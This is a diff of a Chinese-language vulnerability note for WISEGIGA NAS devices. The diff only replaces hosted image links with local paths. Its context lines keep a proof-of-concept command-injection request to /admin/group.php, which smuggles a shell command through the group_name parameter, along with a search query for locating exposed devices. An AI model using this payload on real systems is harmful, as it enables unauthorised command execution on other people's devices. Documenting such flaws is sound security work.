@@ -22,7 +22,7 @@ app="WISEGIGA-NAS"
 
 主页面
 
-![image-20220628113649787](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202206281144970.png)
+![image-20220628113649787](./images/202206281144970.png)
 
 验证POC
 
@@ -30,10 +30,10 @@ app="WISEGIGA-NAS"
 /admin/group.php?memberid=root&cmd=add&group_name=d;id>1.txt
 ```
 
-![image-20220628114731029](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202206281147112.png)
+![image-20220628114731029](./images/202206281147112.png)
 
 ```
 /admin/1.txt
 ```
 
-![image-20220628114740534](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202206281147595.png)
+![image-20220628114740534](./images/202206281147595.png)
